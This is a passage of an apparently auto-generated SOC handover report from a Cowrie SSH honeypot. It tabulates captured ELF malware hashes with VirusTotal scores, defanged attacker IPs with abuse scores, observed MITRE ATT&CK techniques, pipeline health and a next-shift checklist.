| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `220.135.226[.]87` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 7 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `18.116.202[.]164` | US | Amazon Technologies Inc. | **100** ⚠️ | 34 |
| `20.55.24[.]39` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `35.188.112[.]111` | US | Google LLC | **100** ⚠️ | 50 |
| `121.29.4[.]74` | CN | China Unicom Hebei province network | **100** ⚠️ | 17 |
| `40.78.155[.]180` | US | Microsoft Corporation | **100** ⚠️ | 8 |
| `20.65.145[.]247` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `45.148.120[.]187` | NL | SpectraIP B.V. | **100** ⚠️ | 0 |
| `45.175.36[.]10` | VE | TCA SERVICES C.A. | **73** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 18 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 9 recon entry/entries in table (6 group(s) consolidating 51 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-18T16:49:57Z_
